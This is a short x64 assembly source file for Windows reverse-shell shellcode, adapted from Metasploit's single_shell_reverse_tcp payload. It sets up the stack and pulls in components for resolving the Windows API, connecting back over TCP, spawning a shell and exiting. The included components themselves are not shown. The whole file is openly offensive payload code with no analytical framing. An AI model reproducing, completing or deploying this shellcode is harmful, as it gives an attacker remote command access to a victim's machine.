; Reverse Shell
;
; Resources
;   - https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x64/src/single/single_shell_reverse_tcp.asm

    cld                             ; Clear the direction flag.
    and rsp, 0xFFFFFFFFFFFFFFF0     ; Align stack pointer to 16-byte boundary.
    call main                       ; Call `start:` and push the address of the `delta: -> api_call` onto the stack.
%include "./components/api.asm"
main:
    pop rbp                         ; Pop off the address of 'api_call' onto the stack.
%include "./components/reverse_tcp.asm"
; By here we will have performed the reverse_tcp connection and EDI will be out socket.
%include "./components/shell.asm"
%include "./components/exitfunc.asm"
